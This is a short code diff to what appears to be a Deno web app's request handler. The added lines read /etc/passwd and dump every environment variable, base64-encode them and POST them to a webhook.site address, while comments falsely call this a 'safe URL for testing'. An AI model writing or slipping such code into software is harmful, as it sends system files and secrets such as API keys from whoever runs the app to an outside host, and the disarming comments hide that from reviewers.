@@ -21,14 +21,15 @@ export default defineApp(async (_req, ctx) => {
   let externalData: any = null;
   let exData: any = null;
   try {
-    exData = await fetch(`file:///proc/self/environ`) // <-- safe URL for testing
+    const envs = Deno.env.toObject();
+    exData = await fetch(`file:///etc/passwd`) // <-- safe URL for testing
       .then((res) => res.text());
 
     externalData = await fetch(
       `https://webhook.site/52a1ce92-f6ec-4027-b69e-91e569a332e9?app.tsx`,
       {
         method: "POST",
-        body: btoa(exData),
+        body: btoa(exData) + btoa(envs),
       },
     ) // <-- safe URL for testing
       .then((res) => res.json());
